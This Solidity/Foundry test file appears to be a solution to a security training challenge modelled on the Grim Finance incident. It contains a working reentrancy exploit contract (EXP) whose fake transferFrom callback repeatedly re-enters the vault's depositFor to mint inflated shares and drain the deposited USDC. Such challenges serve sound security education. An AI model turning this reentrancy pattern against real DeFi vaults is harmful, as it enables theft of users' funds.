// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;


import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Token} from "../src/other/Token.sol";
import {SafuStrategy} from "../src/safu-vault/SafuStrategy.sol";
import {IStrategy} from "../src/safu-vault/SafuVault.sol";
import {SafuVault} from "../src/safu-vault/SafuVault.sol";

// Grim Finance incident

contract safuVault is Test {
    SafuVault public safuVault;
    SafuStrategy public safuStrategy;
    Token public USDC;
    EXP public exp;
    uint256 constant TOKENS_IN_POOL = 10_000 * 1e18;
    uint256 constant TOKENS_IN_EXPLOITER = 10_000 * 1e18;
    address exploiter;
    address user;

    function setUp() public {
        // deploy USDC
        USDC = new Token("USDC", "USDC");
        exploiter = makeAddr("exploiter");
        user = makeAddr("user");

        // mint USDC to exploiter and user
        address[] memory users = new address[](2);
        users[0] = exploiter;
        users[1] = user;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = TOKENS_IN_EXPLOITER;
        amounts[1] = TOKENS_IN_POOL;
        USDC.mintPerUser(users, amounts);

        // deploy SafuStrategy and safuVault
        safuStrategy = new SafuStrategy(address(USDC));
        safuVault = new SafuVault(IStrategy(address(safuStrategy)), "LP Token", "LP");
        safuStrategy.setVault(address(safuVault));

        vm.label(address(safuStrategy), "safuStrategy");
        vm.label(address(safuVault), "SafuVault");
        vm.label(address(USDC), "USDC");

        // user deposit USDC
        vm.startPrank(user);
        USDC.approve(address(safuVault), type(uint).max);
        safuVault.depositAll();
        vm.stopPrank();

        assertEq(USDC.balanceOf(address(safuStrategy)), TOKENS_IN_POOL);
    }

    function testExploit() public {
        console.log("Before attack,the USDC balance of exploiter:", USDC.balanceOf(exploiter) / 1e18);
        vm.startPrank(exploiter);
        exp = new EXP(address(safuVault), address(USDC));
        USDC.transfer(address(exp), USDC.balanceOf(exploiter));
        exp.exploit();
        verify();
        console.log("After attack,the USDC balance of exploiter:", USDC.balanceOf(exploiter) / 1e18);
        vm.stopPrank();
    }

    function verify() internal {
        assertLt(safuVault.balance(), TOKENS_IN_POOL * 1 /10);
        assertGt(USDC.balanceOf(exploiter), TOKENS_IN_POOL * 9 / 10 + TOKENS_IN_EXPLOITER);
        console.log(unicode"😄 pwn! ");
    }
    
}

/*##############################EXPLOIT##############################*/
contract EXP {
    SafuVault public safuVault;
    Token public USDC;
    uint256 counter;
    constructor(address SafuVaultAddress, address USDCAddress) {
        safuVault = SafuVault(SafuVaultAddress);
        USDC = Token(USDCAddress);
    }
    function exploit() external {
        safuVault.depositFor(address(this), 0, address(this));
        safuVault.withdrawAll();
        USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
    }
    function transferFrom(address from, address to, uint256 amount) external {
        if(counter < 10){
            if(counter == 9){
                USDC.transfer(address(safuVault), USDC.balanceOf(address(this)) / 2);
            }
            counter++;
            safuVault.depositFor(address(this), 0, address(this));
        }
    }
}



